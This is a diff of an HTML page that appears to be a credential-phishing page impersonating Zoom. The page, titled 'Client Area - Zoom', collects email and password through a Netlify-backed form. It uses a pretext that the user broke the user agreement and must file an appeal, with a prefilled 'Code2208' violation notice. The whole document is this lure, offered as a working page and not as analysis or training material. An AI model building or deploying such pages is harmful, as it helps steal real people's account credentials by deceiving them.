@@ -1,35 +1,98 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>Zoom User Apeal</title>
-</head>
+<title>Client Area - Zoom</title>
+  
+ <style type="text/css">
+ 
+ *{
+ margin:0;
+ padding:0;
+ font-family:sans-serif;
+ }
+ 
+ form{
+ display:flex;
+ flex-direction:column;
+ justify-content:center;
+ align-items:center;
+ gap:20px;
+ height:85vh;
+ }
+ 
+ body{
+ display:flex;
+ flex-direction:column;
+ height:100vh;
+ background-color:skyblue;
+ }
+ 
+ input{
+ 
+ width:70vw;
+ padding:15px;
+ text-align:center;
+ border:none;
+ border-radius:5px;
+ font-size:300%;
+ 
+ }
+ 
+ textarea{
+ 
+ font-size:300%;
+ padding:20px;
+ border-radius:5px;
+ 
+  }
+  
+  button{
+  border:none;
+  font-size:300%;
+  padding:15px;
+  }
+  
+  div{
+  
+  display:flex;
+  font-size:300%;
+  background:grey;
+  padding:20px;
+  justify-content:center;
+  align-items:center;
+  color:white;
+  
+  }
+ </style>
+  
 
+</head>
 <body>
 
-<div class="rendered-form">
-    <div class="formbuilder-text form-group field-Email">
-        <label for="Email" class="formbuilder-text-label">Email<span class="formbuilder-required">*</span></label>
-        <input type="email" placeholder="Email" class="form-control" name="Email" access="false" id="Email" required="required" aria-required="true">
-    </div>
-    <div class="formbuilder-text form-group field-Password">
-        <label for="Password" class="formbuilder-text-label">Password<span class="formbuilder-required">*</span></label>
-        <input type="password" placeholder="Password" class="form-control" name="Password" access="false" id="Password" required="required" aria-required="true">
-    </div>
-    <div class="formbuilder-select form-group field-select-1656018653311">
-        <label for="select-1656018653311" class="formbuilder-select-label">Meeting For<span class="formbuilder-required">*</span></label>
-        <select class="form-control" name="select-1656018653311" access="true" id="select-1656018653311" required="required" aria-required="true">
-            <option value="option-1" selected="true" id="select-1656018653311-0">School Or Class</option>
-            <option value="option-2" id="select-1656018653311-1">Work</option>
-            <option value="option-3" id="select-1656018653311-2">Other</option>
-        </select>
-    </div>
-    <div class="formbuilder-date form-group field-date-1656018673248">
-        <label for="date-1656018673248" class="formbuilder-date-label">Date of birth</label>
-        <input type="date" class="form-control" name="date-1656018673248" access="false" id="date-1656018673248">
-    </div>
-    <div class="formbuilder-button form-group field-button-1656018762941">
-        <button type="button" class="btn-primary btn" name="button-1656018762941" access="false" style="primary" id="button-1656018762941">Next</button>
-    </div>
+<div>
+
+
+<h2>Client Area</h2>
 </div>
+
+<form method="POST" data-netlify="true"> 
+
+<input name="email" placeholder="Email"
+type="email"  required>
+<input name="password" placeholder="Passsword"
+type="password" required>
+<textarea placeholder="Your appeal" rows="10"
+>This is an appeal for Code2208 Breaking User Agreemant line 34.6</textarea>
+
+<button  type="submit"
+>Submit</button>
+</form>
+
+<script type="text/javascript">
+
+alert("Rotate Your Phone To Portrait")
+
+</script>
 
 </body>
 </html>
